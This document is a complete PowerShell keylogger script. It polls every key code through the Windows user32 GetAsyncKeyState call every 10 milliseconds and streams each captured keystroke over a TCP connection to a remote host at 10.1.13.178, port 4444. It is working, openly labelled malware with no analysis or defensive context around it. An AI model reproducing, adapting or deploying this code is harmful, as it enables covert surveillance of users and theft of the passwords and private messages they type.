# PowerShell Keylogger Script
$remoteIP = "10.1.13.178"
$remotePort = 4444
$tcpClient = New-Object System.Net.Sockets.TcpClient($remoteIP, $remotePort)
$stream = $tcpClient.GetStream()
$writer = New-Object System.IO.StreamWriter $stream
$writer.AutoFlush = $true

Add-Type @"
    using System;
    using System.Runtime.InteropServices;
    public class Keyboard {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
    }
"@

while ($true) {
    Start-Sleep -Milliseconds 10
    foreach ($code in 1..255) {
        if ([Keyboard]::GetAsyncKeyState($code) -eq -32767) {
            $char = [char]$code
            $writer.WriteLine($char)
        }
    }
}
